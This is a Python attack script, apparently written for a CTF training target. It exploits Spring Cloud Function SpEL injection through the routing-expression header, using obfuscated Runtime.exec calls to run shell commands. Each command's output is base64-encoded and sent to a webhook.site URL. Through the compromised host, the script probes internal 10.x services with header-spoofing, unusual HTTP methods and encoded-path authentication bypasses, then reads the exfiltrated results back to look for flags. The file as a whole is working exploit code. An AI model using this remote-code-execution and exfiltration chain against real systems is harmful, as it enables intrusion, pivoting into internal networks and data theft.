#!/usr/bin/env python3
"""
CTF Chile - Intentos creativos de autenticación y bypass
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Intentando métodos creativos de autenticación...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:45} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Probar User-Agents específicos...")

# User-Agents específicos que podrían ser requeridos
user_agents = [
    "OmniVault/1.0", "BankingClient/2.0", "VaultAPI/1.0",
    "InternalService/1.0", "AdminTool/1.0", "JMXConsole/1.0"
]

hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    host_safe = host.replace(".", "_")
    for i, ua in enumerate(user_agents):
        ua_safe = ua.replace("/", "_").replace(".", "_")
        probe(f"ua_{host_safe}_{ua_safe}", f"curl -s -H 'User-Agent: {ua}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 2: Probar headers de origen y referrer...")

# Headers de origen que podrían ser validados
origin_headers = [
    "http://10.109.220.4:8080", "http://10.160.209.2:8080",
    "http://localhost:8080", "http://omnivault.internal",
    "http://vault.local", "http://admin.omnivault.com"
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for i, origin in enumerate(origin_headers[:3]):  # Solo las primeras 3
        origin_safe = origin.replace(":", "_").replace("/", "_").replace(".", "_")
        probe(f"origin_{host_safe}_{origin_safe}", f"curl -s -H 'Origin: {origin}' -H 'Referer: {origin}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 3: Probar métodos HTTP con headers específicos...")

# Combinaciones de métodos HTTP con headers específicos
http_combos = [
    ("POST", "application/x-www-form-urlencoded", "command=ls"),
    ("POST", "text/plain", "ls"),
    ("PUT", "application/json", '{"action":"execute","command":"whoami"}'),
    ("PATCH", "application/json", '{"cmd":"id"}')
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for i, (method, content_type, data) in enumerate(http_combos):
        method_safe = method.lower()
        probe(f"combo_{host_safe}_{method_safe}_{i}", f"curl -s -X {method} -H 'Content-Type: {content_type}' -d '{data}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 4: Probar autenticación basada en IP origen...")

# Probar headers que simulan diferentes IPs origen
ip_headers = [
    ("X-Forwarded-For", "10.109.220.4"),
    ("X-Real-IP", "10.160.209.2"),
    ("X-Original-IP", "127.0.0.1"),
    ("X-Client-IP", "localhost")
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for header, ip in ip_headers[:2]:  # Solo las primeras 2
        header_safe = header.replace("-", "_").lower()
        ip_safe = ip.replace(".", "_")
        probe(f"ip_{host_safe}_{header_safe}_{ip_safe}", f"curl -s -H '{header}: {ip}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 5: Probar bypass con doble codificación y Unicode...")

# Intentar bypass con diferentes encodings
encoded_paths = [
    "/execute", "//execute", "/execute/", "/execute//",
    "/%65xecute", "/ex%65cute", "/exec%75te"
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for i, path in enumerate(encoded_paths[:4]):  # Solo las primeras 4
        path_safe = str(i)
        probe(f"encode_{host_safe}_path_{path_safe}", f"curl -s http://{host}:8000{path} 2>/dev/null")

print("[*] FASE 6: Probar con headers de administración comunes...")

# Headers comunes de administración
admin_headers = [
    ("X-Admin", "true"),
    ("X-Internal", "true"),
    ("X-Debug", "1"),
    ("X-Vault-Admin", "true"),
    ("X-Service-Auth", "internal"),
    ("X-From-Internal", "true")
]

for host in hosts:
    host_safe = host.replace(".", "_")
    for header, value in admin_headers[:3]:  # Solo las primeras 3
        header_safe = header.replace("-", "_").lower()
        probe(f"admin_{host_safe}_{header_safe}", f"curl -s -H '{header}: {value}' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 7: Probar solicitudes con múltiples headers combinados...")

# Combinaciones de headers que podrían funcionar juntos
for host in hosts:
    host_safe = host.replace(".", "_")

    # Combinación 1: Admin + Internal + Auth
    probe(f"multi_{host_safe}_admin_internal", f"curl -s -H 'X-Admin: true' -H 'X-Internal: true' -H 'X-Forwarded-For: 10.109.220.4' http://{host}:8000/execute 2>/dev/null")

    # Combinación 2: User-Agent + Origin + Auth
    probe(f"multi_{host_safe}_ua_origin", f"curl -s -H 'User-Agent: OmniVault/1.0' -H 'Origin: http://10.109.220.4:8080' -H 'X-Vault-Admin: true' http://{host}:8000/execute 2>/dev/null")

print("[*] FASE 8: Probar métodos no estándar...")

# Métodos HTTP menos comunes
unusual_methods = ["MOVE", "COPY", "LOCK", "UNLOCK", "PROPFIND"]

for host in hosts:
    host_safe = host.replace(".", "_")
    for method in unusual_methods[:3]:  # Solo los primeros 3
        method_safe = method.lower()
        probe(f"unusual_{host_safe}_{method_safe}", f"curl -s -X {method} http://{host}:8000/execute 2>/dev/null")

time.sleep(25)

# Recoger y analizar respuestas
print("\n[*] Analizando intentos creativos...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=50", timeout=20)
data = r.json().get("data", [])

bypass_successes = []
different_responses = []
error_clues = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar respuestas diferentes a 403
            if "403" not in decoded and "Forbidden" not in decoded.lower():
                if len(decoded.strip()) > 10:
                    bypass_successes.append((path, decoded))
                    print("✅ POSIBLE BYPASS EXITOSO")

            # Detectar respuestas diferentes que no sean la típica 403
            if any(keyword in decoded.lower() for keyword in ["400", "401", "422", "500", "error", "invalid"]):
                different_responses.append((path, decoded))
                print("🔍 RESPUESTA DIFERENTE")

            # Detectar mensajes de error útiles
            if any(keyword in decoded.lower() for keyword in ["missing", "required", "parameter", "expected"]):
                error_clues.append((path, decoded))
                print("💡 PISTA DE ERROR")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE INTENTOS CREATIVOS")
print("="*70)

if bypass_successes:
    print(f"✅ POSIBLES BYPASSES EXITOSOS: {len(bypass_successes)}")
    for path, content in bypass_successes:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if different_responses:
    print(f"\n🔍 RESPUESTAS DIFERENTES: {len(different_responses)}")
    for path, content in different_responses:
        print(f"    - {path}: {content[:100]}...")

if error_clues:
    print(f"\n💡 PISTAS DE ERROR: {len(error_clues)}")
    for path, content in error_clues:
        print(f"    - {path}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 Continuar explorando otros vectores de ataque...")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")